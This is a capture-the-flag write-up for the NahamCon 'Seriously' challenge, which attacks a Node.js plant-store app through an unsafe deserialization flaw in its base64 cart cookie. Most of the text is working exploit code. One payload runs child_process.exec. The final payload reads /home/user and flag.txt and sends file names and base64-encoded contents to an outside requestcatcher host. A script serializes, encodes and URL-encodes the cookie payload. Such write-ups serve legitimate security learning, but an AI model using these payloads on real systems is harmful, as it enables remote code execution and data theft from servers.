# NahamCon CTF - Seriously

So we have five "plant stores" and we need to hack it to get the flag.
At first I thought the challenge was somehow related to escalate privileges among them.

There are two hints here:
* The message on the checkout option, saying it was prohibited due to security issues.
* The name of the game itself ("seriously"), as I found later.

I tried all the stores to see if the checkout was open on any of them, but they were not (and stores 3 and 4 were down).

The **/cart** URL used a cookie called also **cart**, to store the items, encoded in base64:
**Base64:**
```
eyJpdGVtcyI6eyIwIjp7Im5hbWUiOiJIYXdvcnRoaW9wc2lzIGF0dGVudWF0YSIsInByaWNlIjoxOS45OSwiY291bnQiOjF9LCIyIjp7Im5hbWUiOiJEcmFjYWVuYSB0cmlmYXNjaWF0YSIsInByaWNlIjoxNC45OSwiY291bnQiOjF9fX0K`
```
**Decoded:** 
```
{"items":{"0":{"name":"Haworthiopsis attenuata","price":19.99,"count":1},"2":{"name":"Dracaena trifasciata","price":14.99,"count":1}}}
````
OK, using a 404 error, we see it's a node application, so I found a Javascript deserialization vulnerability.

### First Try: Shell

Using a sample payload online, I tried to call OS commands.
The snippet bellow is the same structure of the cart, but I changed the name to an evil function.

```
evil = {
  items: {
    '0': { name: 'Haworthiopsis attenuata', price: 19.99, count: 1 },
    '2': { name: 'Dracaena trifasciata', price: 14.99, count: 1 },
    '3': { name: function(){
            require('child_process').exec('ls / >> nep10.txt', function(error, stdout, stderr) { return 'Neptunian'; });
        }, 
        price: 14.99, count: 1,  },
  }
}**()**
```

And the plan is to serialize the evil object to send to the server.

Something about the **()** above: if you put the parentheses in this constructor, it will run the function, and the serialized version will get only the result.
I had to put the **()** it after serializing for it to run only after deserialization.
Automated the replace to test faster.

And testing:
```
let buff = new Buffer.from(serialize.serialize(evil));

console.log('Evil Serialized:');
// buff2 = buff.toString('ascii');

// Had to replace here to be automatic.
// If I put the "()" and the end of the function, it will run and serialize the result!!
// But if I put only in the serialized version, it will run only in the server, just after deserializing!
// This way, I can work with a complete code, test the payload locally (below) and send it ready to the server.
buff2 = buff.toString('ascii').replace('}","price', '}()","price');
console.log(buff2 + '\n\n');

console.log('Evil Base64');
let base64data = Buffer.from(buff2).toString('base64');
console.log(base64data + '\n\n');

console.log('Evil URL Encoded:');
let payload = urlencode(base64data);
console.log(payload + '\n\n');
```

Now I had a payload.
It worked locally, but I couldnt make the exec command work (tried with curl instead of **ls**).

### The Real Deal: Owning with Javascript

I dont really need a shell when I can run Javascript code on the server.
So lets change the Evil object.

The plan is to send result of the commands to **requestcatcher**.
The error hints that the application is in the **/home/user**, so the plan is to list the files and see if the flag is there.

```
// Kept the basic structure of the cart
// First: listed files on /home/user dir
// After: get flag in base64 format to send (owned!)
evil2 = {
  items: {
    '0': { name: 'Haworthiopsis attenuata', price: 19.99, count: 1 },
    '2': { name: 'Dracaena trifasciata', price: 14.99, count: 1 },
    '3': { name: function(){

            mysite = 'https://neptunian147.requestcatcher.com';

            require('request')(mysite - '/working', function (error, response, body) { console.log(body); });

            var fs = require('fs');
            const path = require('path');
            //joining path of directory 
            // require('path').dirname(require.main.filename)''; //__dirname
            const directoryPath =  '/home/user';
            //passsing directoryPath and callback function
            fs.readdir(directoryPath, function (err, files) {
                //handling error
                if (err) {
                    return console.log('Unable to scan directory: ' + err);
                    require('request')(mysite + '/shitt-happens', function (error, response, body) { console.log(body); });
                } 

                //listing all files using forEach
                files.forEach(function (file) {
                    // Do whatever you want to do with the file
                    console.log(file); 

                    require('request')(mysite + '/store2?file=' + file, function (error, response, body) { console.log(body); });
                });
            });},price: 14.99, count: 1,  },
  }
};
```

And after that:
![Request Catcher - Round 1](https://github.com/Neptunians/nahamcon-ctf/blob/master/seriously/request_catcher_screenshot_1.png)

So, let's include a block to get the flag content and send it, using base64 to avoid any problems:

```
var fs = require('fs');
fs.readFile('/home/user/flag.txt', function(err, data) {
    let base64flag = Buffer.from(data).toString('base64');

    require('request')(mysite + '/working?flag=' + base64flag, function (error, response, body) { console.log(body); });
});
```

And something happens:
![Request Catcher - Round 1](https://github.com/Neptunians/nahamcon-ctf/blob/master/seriously/request_catcher_screenshot_1.png)

Decodes to:

```
$ echo "ZmxhZ3tzZXJpb3VzbHlfZGVzZXJpYWxpemF0aW9uX3dpdGhfcGxhbnRzfQo=" | base64 -d
flag{seriously_deserialization_with_plants}
```

Owned!

```
### Final Payload

evil2 = {
  items: {
    '0': { name: 'Haworthiopsis attenuata', price: 19.99, count: 1 },
    '2': { name: 'Dracaena trifasciata', price: 14.99, count: 1 },
    '3': { name: function(){

            mysite = 'https://neptunian147.requestcatcher.com';

            require('request')(mysite - '/working', function (error, response, body) { console.log(body); });

            var fs = require('fs');
            fs.readFile('/home/user/flag.txt', function(err, data) {
                let base64flag = Buffer.from(data).toString('base64');

                require('request')(mysite + '/working?flag=' + base64flag, function (error, response, body) { console.log(body); });
              });

            const path = require('path');
            //joining path of directory 
            // require('path').dirname(require.main.filename)''; //__dirname
            const directoryPath =  '/home/user';
            //passsing directoryPath and callback function
            fs.readdir(directoryPath, function (err, files) {
                //handling error
                if (err) {
                    return console.log('Unable to scan directory: ' + err);
                    require('request')(mysite + '/shitt-happens', function (error, response, body) { console.log(body); });
                } 

                //listing all files using forEach
                files.forEach(function (file) {
                    // Do whatever you want to do with the file
                    console.log(file); 

                    require('request')(mysite + '/store2?file=' + file, function (error, response, body) { console.log(body); });
                });
            });},price: 14.99, count: 1,  },
  }
};

// Lets serialize the payload
let buff = new Buffer.from(serialize.serialize(evil2));

console.log('Evil Serialized:');
// buff2 = buff.toString('ascii');

// Had to replace here to be automatic.
// If I put the "()" and the end of the function, it will run and serialize the result!!
// But if I put only in the serialized version, it will run only in the server, just after deserializing!
// This way, I can work with a complete code, test the payload locally (below) and send it ready to the server.
buff2 = buff.toString('ascii').replace('}","price', '}()","price');
console.log(buff2 + '\n\n');

console.log('Evil Base64');
let base64data = Buffer.from(buff2).toString('base64');
console.log(base64data + '\n\n');

console.log('Evil URL Encoded:');
let payload = urlencode(base64data);
console.log(payload + '\n\n');
```